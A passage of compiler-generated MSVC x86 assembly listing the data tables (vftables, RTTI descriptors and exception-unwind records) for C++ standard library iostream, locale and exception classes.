	DD	FLAT:??_E?$basic_ostream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z
CONST	ENDS
;	COMDAT ??_8?$basic_istream@DU?$char_traits@D@std@@@std@@7B@
CONST	SEGMENT
??_8?$basic_istream@DU?$char_traits@D@std@@@std@@7B@ DD 00H ; std::basic_istream<char,std::char_traits<char> >::`vbtable'
	DD	018H
CONST	ENDS
;	COMDAT ??_7?$basic_istream@DU?$char_traits@D@std@@@std@@6B@
CONST	SEGMENT
??_7?$basic_istream@DU?$char_traits@D@std@@@std@@6B@ DD FLAT:??_R4?$basic_istream@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_istream<char,std::char_traits<char> >::`vftable'
	DD	FLAT:??_E?$basic_istream@DU?$char_traits@D@std@@@std@@$4PPPPPPPM@A@AEPAXI@Z
CONST	ENDS
;	COMDAT ??_7?$basic_ios@DU?$char_traits@D@std@@@std@@6B@
CONST	SEGMENT
??_7?$basic_ios@DU?$char_traits@D@std@@@std@@6B@ DD FLAT:??_R4?$basic_ios@DU?$char_traits@D@std@@@std@@6B@ ; std::basic_ios<char,std::char_traits<char> >::`vftable'
	DD	FLAT:??_E?$basic_ios@DU?$char_traits@D@std@@@std@@UAEPAXI@Z
CONST	ENDS
;	COMDAT __CT??_R0?AVfailure@ios_base@std@@@8??0failure@ios_base@std@@QAE@ABV012@@Z20
xdata$x	SEGMENT
__CT??_R0?AVfailure@ios_base@std@@@8??0failure@ios_base@std@@QAE@ABV012@@Z20 DD 00H
	DD	FLAT:??_R0?AVfailure@ios_base@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	014H
	DD	FLAT:??0failure@ios_base@std@@QAE@ABV012@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVfailure@ios_base@std@@@8
data$r	SEGMENT
??_R0?AVfailure@ios_base@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::ios_base::failure `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVfailure@ios_base@std@@', 00H
data$r	ENDS
;	COMDAT __CTA5?AVfailure@ios_base@std@@
xdata$x	SEGMENT
__CTA5?AVfailure@ios_base@std@@ DD 05H
	DD	FLAT:__CT??_R0?AVfailure@ios_base@std@@@8??0failure@ios_base@std@@QAE@ABV012@@Z20
	DD	FLAT:__CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QAE@ABV01@@Z20
	DD	FLAT:__CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QAE@ABV01@@Z20
	DD	FLAT:__CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QAE@ABV01@@Z12
	DD	FLAT:__CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12
xdata$x	ENDS
;	COMDAT __TI5?AVfailure@ios_base@std@@
xdata$x	SEGMENT
__TI5?AVfailure@ios_base@std@@ DD 00H
	DD	FLAT:??1failure@ios_base@std@@UAE@XZ
	DD	00H
	DD	FLAT:__CTA5?AVfailure@ios_base@std@@
xdata$x	ENDS
;	COMDAT ??_C@_0BF@OOHOMBOF@ios_base?3?3eofbit?5set@
CONST	SEGMENT
??_C@_0BF@OOHOMBOF@ios_base?3?3eofbit?5set@ DB 'ios_base::eofbit set', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BG@FMKFHCIL@ios_base?3?3failbit?5set@
CONST	SEGMENT
??_C@_0BG@FMKFHCIL@ios_base?3?3failbit?5set@ DB 'ios_base::failbit set', 00H ; `string'
CONST	ENDS
;	COMDAT ??_C@_0BF@PHHKMMFD@ios_base?3?3badbit?5set@
CONST	SEGMENT
??_C@_0BF@PHHKMMFD@ios_base?3?3badbit?5set@ DB 'ios_base::badbit set', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7ios_base@std@@6B@
CONST	SEGMENT
??_7ios_base@std@@6B@ DD FLAT:??_R4ios_base@std@@6B@	; std::ios_base::`vftable'
	DD	FLAT:??_Eios_base@std@@UAEPAXI@Z
CONST	ENDS
;	COMDAT ??_7failure@ios_base@std@@6B@
CONST	SEGMENT
??_7failure@ios_base@std@@6B@ DD FLAT:??_R4failure@ios_base@std@@6B@ ; std::ios_base::failure::`vftable'
	DD	FLAT:??_Efailure@ios_base@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT ??_7?$ctype@D@std@@6B@
CONST	SEGMENT
??_7?$ctype@D@std@@6B@ DD FLAT:??_R4?$ctype@D@std@@6B@	; std::ctype<char>::`vftable'
	DD	FLAT:??_E?$ctype@D@std@@MAEPAXI@Z
	DD	FLAT:?_Incref@facet@locale@std@@UAEXXZ
	DD	FLAT:?_Decref@facet@locale@std@@UAEPAV_Facet_base@3@XZ
	DD	FLAT:?do_tolower@?$ctype@D@std@@MBEPBDPADPBD@Z
	DD	FLAT:?do_tolower@?$ctype@D@std@@MBEDD@Z
	DD	FLAT:?do_toupper@?$ctype@D@std@@MBEPBDPADPBD@Z
	DD	FLAT:?do_toupper@?$ctype@D@std@@MBEDD@Z
	DD	FLAT:?do_widen@?$ctype@D@std@@MBEPBDPBD0PAD@Z
	DD	FLAT:?do_widen@?$ctype@D@std@@MBEDD@Z
	DD	FLAT:?do_narrow@?$ctype@D@std@@MBEPBDPBD0DPAD@Z
	DD	FLAT:?do_narrow@?$ctype@D@std@@MBEDDD@Z
CONST	ENDS
;	COMDAT ??_7ctype_base@std@@6B@
CONST	SEGMENT
??_7ctype_base@std@@6B@ DD FLAT:??_R4ctype_base@std@@6B@ ; std::ctype_base::`vftable'
	DD	FLAT:??_Ectype_base@std@@UAEPAXI@Z
	DD	FLAT:?_Incref@facet@locale@std@@UAEXXZ
	DD	FLAT:?_Decref@facet@locale@std@@UAEPAV_Facet_base@3@XZ
CONST	ENDS
;	COMDAT ??_7codecvt_base@std@@6B@
CONST	SEGMENT
??_7codecvt_base@std@@6B@ DD FLAT:??_R4codecvt_base@std@@6B@ ; std::codecvt_base::`vftable'
	DD	FLAT:??_Ecodecvt_base@std@@UAEPAXI@Z
	DD	FLAT:?_Incref@facet@locale@std@@UAEXXZ
	DD	FLAT:?_Decref@facet@locale@std@@UAEPAV_Facet_base@3@XZ
	DD	FLAT:?do_always_noconv@codecvt_base@std@@MBE_NXZ
	DD	FLAT:?do_max_length@codecvt_base@std@@MBEHXZ
	DD	FLAT:?do_encoding@codecvt_base@std@@MBEHXZ
CONST	ENDS
;	COMDAT ??_7facet@locale@std@@6B@
CONST	SEGMENT
??_7facet@locale@std@@6B@ DD FLAT:??_R4facet@locale@std@@6B@ ; std::locale::facet::`vftable'
	DD	FLAT:??_Efacet@locale@std@@MAEPAXI@Z
	DD	FLAT:?_Incref@facet@locale@std@@UAEXXZ
	DD	FLAT:?_Decref@facet@locale@std@@UAEPAV_Facet_base@3@XZ
CONST	ENDS
;	COMDAT ??_C@_0BA@ELKIONDK@bad?5locale?5name@
CONST	SEGMENT
??_C@_0BA@ELKIONDK@bad?5locale?5name@ DB 'bad locale name', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7_Facet_base@std@@6B@
CONST	SEGMENT
??_7_Facet_base@std@@6B@ DD FLAT:??_R4_Facet_base@std@@6B@ ; std::_Facet_base::`vftable'
	DD	FLAT:??_E_Facet_base@std@@UAEPAXI@Z
	DD	FLAT:__purecall
	DD	FLAT:__purecall
CONST	ENDS
;	COMDAT __CT??_R0?AVbad_cast@std@@@8??0bad_cast@std@@QAE@ABV01@@Z12
xdata$x	SEGMENT
__CT??_R0?AVbad_cast@std@@@8??0bad_cast@std@@QAE@ABV01@@Z12 DD 00H
	DD	FLAT:??_R0?AVbad_cast@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	0cH
	DD	FLAT:??0bad_cast@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_cast@std@@@8
data$r	SEGMENT
??_R0?AVbad_cast@std@@@8 DD FLAT:??_7type_info@@6B@	; std::bad_cast `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVbad_cast@std@@', 00H
data$r	ENDS
;	COMDAT __CTA2?AVbad_cast@std@@
xdata$x	SEGMENT
__CTA2?AVbad_cast@std@@ DD 02H
	DD	FLAT:__CT??_R0?AVbad_cast@std@@@8??0bad_cast@std@@QAE@ABV01@@Z12
	DD	FLAT:__CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12
xdata$x	ENDS
;	COMDAT __TI2?AVbad_cast@std@@
xdata$x	SEGMENT
__TI2?AVbad_cast@std@@ DD 00H
	DD	FLAT:??1bad_cast@std@@UAE@XZ
	DD	00H
	DD	FLAT:__CTA2?AVbad_cast@std@@
xdata$x	ENDS
;	COMDAT ??_C@_08EPJLHIJG@bad?5cast@
CONST	SEGMENT
??_C@_08EPJLHIJG@bad?5cast@ DB 'bad cast', 00H		; `string'
CONST	ENDS
;	COMDAT ??_7bad_cast@std@@6B@
CONST	SEGMENT
??_7bad_cast@std@@6B@ DD FLAT:??_R4bad_cast@std@@6B@	; std::bad_cast::`vftable'
	DD	FLAT:??_Ebad_cast@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT ?_Iostream_error@?4??message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB
CONST	SEGMENT
?_Iostream_error@?4??message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@3@H@Z@4QBDB DB 069H ; `std::_Iostream_error_category2::message'::`5'::_Iostream_error
	DB	06fH
	DB	073H
	DB	074H
	DB	072H
	DB	065H
	DB	061H
	DB	06dH
	DB	020H
	DB	073H
	DB	074H
	DB	072H
	DB	065H
	DB	061H
	DB	06dH
	DB	020H
	DB	065H
	DB	072H
	DB	072H
	DB	06fH
	DB	072H
	DB	00H
CONST	ENDS
;	COMDAT ??_C@_08LLGCOLLL@iostream@
CONST	SEGMENT
??_C@_08LLGCOLLL@iostream@ DB 'iostream', 00H		; `string'
CONST	ENDS
;	COMDAT ??_7_Iostream_error_category2@std@@6B@
CONST	SEGMENT
??_7_Iostream_error_category2@std@@6B@ DD FLAT:??_R4_Iostream_error_category2@std@@6B@ ; std::_Iostream_error_category2::`vftable'
	DD	FLAT:??_E_Iostream_error_category2@std@@UAEPAXI@Z
	DD	FLAT:?name@_Iostream_error_category2@std@@UBEPBDXZ
	DD	FLAT:?message@_Iostream_error_category2@std@@UBE?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@H@Z
	DD	FLAT:?default_error_condition@error_category@std@@UBE?AVerror_condition@2@H@Z
	DD	FLAT:?equivalent@error_category@std@@UBE_NABVerror_code@2@H@Z
	DD	FLAT:?equivalent@error_category@std@@UBE_NHABVerror_condition@2@@Z
CONST	ENDS
;	COMDAT __CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QAE@ABV01@@Z20
xdata$x	SEGMENT
__CT??_R0?AV_System_error@std@@@8??0_System_error@std@@QAE@ABV01@@Z20 DD 00H
	DD	FLAT:??_R0?AV_System_error@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	014H
	DD	FLAT:??0_System_error@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AV_System_error@std@@@8
data$r	SEGMENT
??_R0?AV_System_error@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::_System_error `RTTI Type Descriptor'
	DD	00H
	DB	'.?AV_System_error@std@@', 00H
data$r	ENDS
;	COMDAT __CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QAE@ABV01@@Z20
xdata$x	SEGMENT
__CT??_R0?AVsystem_error@std@@@8??0system_error@std@@QAE@ABV01@@Z20 DD 00H
	DD	FLAT:??_R0?AVsystem_error@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	014H
	DD	FLAT:??0system_error@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVsystem_error@std@@@8
data$r	SEGMENT
??_R0?AVsystem_error@std@@@8 DD FLAT:??_7type_info@@6B@	; std::system_error `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVsystem_error@std@@', 00H
data$r	ENDS
;	COMDAT ??_C@_00CNPNBAHC@@
CONST	SEGMENT
??_C@_00CNPNBAHC@@ DB 00H				; `string'
CONST	ENDS
;	COMDAT ??_7system_error@std@@6B@
CONST	SEGMENT
??_7system_error@std@@6B@ DD FLAT:??_R4system_error@std@@6B@ ; std::system_error::`vftable'
	DD	FLAT:??_Esystem_error@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT ??_C@_02LMMGGCAJ@?3?5@
CONST	SEGMENT
??_C@_02LMMGGCAJ@?3?5@ DB ': ', 00H			; `string'
CONST	ENDS
;	COMDAT ??_7_System_error@std@@6B@
CONST	SEGMENT
??_7_System_error@std@@6B@ DD FLAT:??_R4_System_error@std@@6B@ ; std::_System_error::`vftable'
	DD	FLAT:??_E_System_error@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT __CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QAE@ABV01@@Z12
xdata$x	SEGMENT
__CT??_R0?AVruntime_error@std@@@8??0runtime_error@std@@QAE@ABV01@@Z12 DD 00H
	DD	FLAT:??_R0?AVruntime_error@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	0cH
	DD	FLAT:??0runtime_error@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVruntime_error@std@@@8
data$r	SEGMENT
??_R0?AVruntime_error@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::runtime_error `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVruntime_error@std@@', 00H
data$r	ENDS
;	COMDAT ??_7runtime_error@std@@6B@
CONST	SEGMENT
??_7runtime_error@std@@6B@ DD FLAT:??_R4runtime_error@std@@6B@ ; std::runtime_error::`vftable'
	DD	FLAT:??_Eruntime_error@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT ??_C@_0BA@JFNIOLAK@string?5too?5long@
CONST	SEGMENT
??_C@_0BA@JFNIOLAK@string?5too?5long@ DB 'string too long', 00H ; `string'
CONST	ENDS
;	COMDAT __CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12
xdata$x	SEGMENT
__CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12 DD 00H
	DD	FLAT:??_R0?AVexception@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	0cH
	DD	FLAT:??0exception@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVexception@std@@@8
data$r	SEGMENT
??_R0?AVexception@std@@@8 DD FLAT:??_7type_info@@6B@	; std::exception `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVexception@std@@', 00H
data$r	ENDS
;	COMDAT __CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QAE@ABV01@@Z12
xdata$x	SEGMENT
__CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QAE@ABV01@@Z12 DD 010H
	DD	FLAT:??_R0?AVbad_alloc@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	0cH
	DD	FLAT:??0bad_alloc@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_alloc@std@@@8
data$r	SEGMENT
??_R0?AVbad_alloc@std@@@8 DD FLAT:??_7type_info@@6B@	; std::bad_alloc `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVbad_alloc@std@@', 00H
data$r	ENDS
;	COMDAT __CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QAE@ABV01@@Z12
xdata$x	SEGMENT
__CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QAE@ABV01@@Z12 DD 00H
	DD	FLAT:??_R0?AVbad_array_new_length@std@@@8
	DD	00H
	DD	0ffffffffH
	ORG $+4
	DD	0cH
	DD	FLAT:??0bad_array_new_length@std@@QAE@ABV01@@Z
xdata$x	ENDS
;	COMDAT ??_R0?AVbad_array_new_length@std@@@8
data$r	SEGMENT
??_R0?AVbad_array_new_length@std@@@8 DD FLAT:??_7type_info@@6B@ ; std::bad_array_new_length `RTTI Type Descriptor'
	DD	00H
	DB	'.?AVbad_array_new_length@std@@', 00H
data$r	ENDS
;	COMDAT __CTA3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
__CTA3?AVbad_array_new_length@std@@ DD 03H
	DD	FLAT:__CT??_R0?AVbad_array_new_length@std@@@8??0bad_array_new_length@std@@QAE@ABV01@@Z12
	DD	FLAT:__CT??_R0?AVbad_alloc@std@@@8??0bad_alloc@std@@QAE@ABV01@@Z12
	DD	FLAT:__CT??_R0?AVexception@std@@@8??0exception@std@@QAE@ABV01@@Z12
xdata$x	ENDS
;	COMDAT __TI3?AVbad_array_new_length@std@@
xdata$x	SEGMENT
__TI3?AVbad_array_new_length@std@@ DD 00H
	DD	FLAT:??1bad_array_new_length@std@@UAE@XZ
	DD	00H
	DD	FLAT:__CTA3?AVbad_array_new_length@std@@
xdata$x	ENDS
;	COMDAT ??_C@_0BF@KINCDENJ@bad?5array?5new?5length@
CONST	SEGMENT
??_C@_0BF@KINCDENJ@bad?5array?5new?5length@ DB 'bad array new length', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7bad_array_new_length@std@@6B@
CONST	SEGMENT
??_7bad_array_new_length@std@@6B@ DD FLAT:??_R4bad_array_new_length@std@@6B@ ; std::bad_array_new_length::`vftable'
	DD	FLAT:??_Ebad_array_new_length@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT ??_7bad_alloc@std@@6B@
CONST	SEGMENT
??_7bad_alloc@std@@6B@ DD FLAT:??_R4bad_alloc@std@@6B@	; std::bad_alloc::`vftable'
	DD	FLAT:??_Ebad_alloc@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT ??_C@_0BC@EOODALEL@Unknown?5exception@
CONST	SEGMENT
??_C@_0BC@EOODALEL@Unknown?5exception@ DB 'Unknown exception', 00H ; `string'
CONST	ENDS
;	COMDAT ??_7exception@std@@6B@
CONST	SEGMENT
??_7exception@std@@6B@ DD FLAT:??_R4exception@std@@6B@	; std::exception::`vftable'
	DD	FLAT:??_Eexception@std@@UAEPAXI@Z
	DD	FLAT:?what@exception@std@@UBEPBDXZ
CONST	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$??$_Deallocate@$07$0A@@std@@YAXPAXI@Z DD 019930522H
	DD	00H
	DD	00H
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	05H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$??1sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ DD 019930522H
	DD	00H
	DD	00H
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	05H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z$0
__ehfuncinfo$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$??0sentry@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@AAV12@@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$??1_Sentry_base@?$basic_ostream@DU?$char_traits@D@std@@@std@@QAE@XZ DD 019930522H
	DD	00H
	DD	00H
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	05H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	034H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z$0
	DD	00H
	DD	FLAT:__unwindfunclet$?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z$1
	DD	0ffffffffH
	DD	FLAT:__unwindfunclet$?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z$1
__ehfuncinfo$?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z DD 019930522H
	DD	03H
	DD	FLAT:__unwindtable$?_Getcat@?$codecvt@DDU_Mbstatet@@@std@@SAIPAPBVfacet@locale@2@PBV42@@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0?$codecvt@DDU_Mbstatet@@@std@@QAE@ABV_Locinfo@1@I@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0?$codecvt@DDU_Mbstatet@@@std@@QAE@ABV_Locinfo@1@I@Z$0
__ehfuncinfo$??0?$codecvt@DDU_Mbstatet@@@std@@QAE@ABV_Locinfo@1@I@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$??0?$codecvt@DDU_Mbstatet@@@std@@QAE@ABV_Locinfo@1@I@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	01eH
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??$use_facet@V?$codecvt@DDU_Mbstatet@@@std@@@std@@YAABV?$codecvt@DDU_Mbstatet@@@0@ABVlocale@0@@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??$use_facet@V?$codecvt@DDU_Mbstatet@@@std@@@std@@YAABV?$codecvt@DDU_Mbstatet@@@0@ABVlocale@0@@Z$0
	DD	00H
	DD	FLAT:__unwindfunclet$??$use_facet@V?$codecvt@DDU_Mbstatet@@@std@@@std@@YAABV?$codecvt@DDU_Mbstatet@@@0@ABVlocale@0@@Z$1
__ehfuncinfo$??$use_facet@V?$codecvt@DDU_Mbstatet@@@std@@@std@@YAABV?$codecvt@DDU_Mbstatet@@@0@ABVlocale@0@@Z DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$??$use_facet@V?$codecvt@DDU_Mbstatet@@@std@@@std@@YAABV?$codecvt@DDU_Mbstatet@@@0@ABVlocale@0@@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	0dH
	DW	0101H
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
	DB	020H
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	01bH
	DW	0238H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$?uflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?uflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ$0
__ehfuncinfo$?uflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$?uflow@?$basic_filebuf@DU?$char_traits@D@std@@@std@@MAEHXZ
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DW	0dH
	DW	01b3H
voltbl	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$?open@?$basic_filebuf@DU?$char_traits@D@std@@@std@@QAEPAV12@PBDHH@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$?open@?$basic_filebuf@DU?$char_traits@D@std@@@std@@QAEPAV12@PBDHH@Z$0
__ehfuncinfo$?open@?$basic_filebuf@DU?$char_traits@D@std@@@std@@QAEPAV12@PBDHH@Z DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$?open@?$basic_filebuf@DU?$char_traits@D@std@@@std@@QAEPAV12@PBDHH@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	09H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__ehfuncinfo$??1?$basic_filebuf@DU?$char_traits@D@std@@@std@@UAE@XZ DD 019930522H
	DD	00H
	DD	00H
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	05H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	016H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0?$basic_filebuf@DU?$char_traits@D@std@@@std@@QAE@XZ DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0?$basic_filebuf@DU?$char_traits@D@std@@@std@@QAE@XZ$0
__ehfuncinfo$??0?$basic_filebuf@DU?$char_traits@D@std@@@std@@QAE@XZ DD 019930522H
	DD	01H
	DD	FLAT:__unwindtable$??0?$basic_filebuf@DU?$char_traits@D@std@@@std@@QAE@XZ
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	040H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@$$QAV01@@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@$$QAV01@@Z$0
	DD	00H
	DD	FLAT:__unwindfunclet$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@$$QAV01@@Z$1
	DD	01H
	DD	FLAT:__unwindfunclet$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@$$QAV01@@Z$2
__ehfuncinfo$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@$$QAV01@@Z DD 019930522H
	DD	03H
	DD	FLAT:__unwindtable$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@$$QAV01@@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	040H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@PBDHH@Z DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@PBDHH@Z$0
	DD	00H
	DD	FLAT:__unwindfunclet$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@PBDHH@Z$1
	DD	01H
	DD	FLAT:__unwindfunclet$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@PBDHH@Z$2
__ehfuncinfo$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@PBDHH@Z DD 019930522H
	DD	03H
	DD	FLAT:__unwindtable$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@PBDHH@Z
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	035H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
__unwindtable$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@XZ DD 0ffffffffH
	DD	FLAT:__unwindfunclet$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@XZ$0
	DD	00H
	DD	FLAT:__unwindfunclet$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@XZ$1
__ehfuncinfo$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@XZ DD 019930522H
	DD	02H
	DD	FLAT:__unwindtable$??0?$basic_fstream@DU?$char_traits@D@std@@@std@@QAE@XZ
	DD	2 DUP(00H)
	DD	2 DUP(00H)
	DD	00H
	DD	01H
xdata$x	ENDS
;	COMDAT voltbl
voltbl	SEGMENT
_volmd	DB	035H
voltbl	ENDS
;	COMDAT xdata$x
xdata$x	SEGMENT
